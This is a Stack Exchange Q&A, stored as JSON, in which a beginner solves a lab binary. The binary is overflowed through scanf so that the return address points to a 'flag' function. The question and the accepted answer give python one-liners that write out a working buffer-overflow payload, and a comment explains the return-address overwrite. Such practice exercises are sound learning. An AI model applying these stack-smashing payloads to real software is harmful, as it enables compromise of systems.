{
    "title": "How to exploit __isoc99_scanf with a segmentation fault",
    "link": "https://reverseengineering.stackexchange.com/questions/29620/how-to-exploit-isoc99-scanf-with-a-segmentation-fault",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I'm an absolute newbie when it comes to all this side of reverse engineering. Each time I try and understand it, I get lost almost immediately.\n </p>\n <p>\n  I am trying a lab. I open it up in Binary Ninja. I get the following\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/SkqAf.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/SkqAf.png\"/>\n  </a>\n </p>\n <p>\n  When I open main I get the following\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/kW4qJ.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/kW4qJ.png\"/>\n  </a>\n </p>\n <p>\n  Nothing much seems to happen but there is a function(?) called flag that looks like what I need\n </p>\n <p>\n  <a href=\"https://i.sstatic.net/maQqE.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/maQqE.png\"/>\n  </a>\n </p>\n <p>\n  When I copy the address, it comes out as:\n </p>\n <pre><code>0x401152\n</code></pre>\n <p>\n  I'm trying to do stuff like this on the command line but getting nowhere fast\n </p>\n <pre><code>python3 -c \"print (28 * 'A' + '\\x52\\x11\\x40')\" | ./santa;\n</code></pre>\n <p>\n  I then try to iterate through and no luck although I do get a segmentation fault on the 53rd iteration\n </p>\n <pre><code>for i in {0..60}; do python3 -c \"print ($i * 'A' + '\\x52\\x11\\x40')\" | ./santa; done\n</code></pre>\n <p>\n  Any pointers? I'm absolutely lost\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 1,
    "views": "5k",
    "tags": [
        "binary-analysis",
        "binary",
        "buffer-overflow"
    ],
    "user": "pee2pee",
    "time": "Nov 26, 2021 at 19:13",
    "comments": [
        {
            "user": "0xC0000022L",
            "text": "<html><body><span class=\"comment-copy\">\n Hi, generally we recommend to paste text as text, not screenshots. The reason being that search engines won't index screenshots the same way as text.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <pre><code>python3 -c \"print (56 * 'A' + '\\x53\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\" | ./santa\n</code></pre>\n</div>\n</body></html>",
            "votes": "0",
            "user": "pee2pee",
            "time": "Nov 26, 2021 at 19:59",
            "is_accepted": true,
            "comments": [
                {
                    "user": "NirIzr",
                    "text": "<span class=\"comment-copy\">Would you care to elaborate on your solution?</span>",
                    "time": null
                },
                {
                    "user": "herohamp",
                    "text": "<span class=\"comment-copy\">Basically they are overflowing the buffer that scanf was entering into, after overflowing out that buffer they will then be filling the saved frame pointer with garbage, after which in the stack comes the return address. So once the function hits retn it'll jump the new address they set 0x401152</span>",
                    "time": null
                }
            ]
        }
    ]
}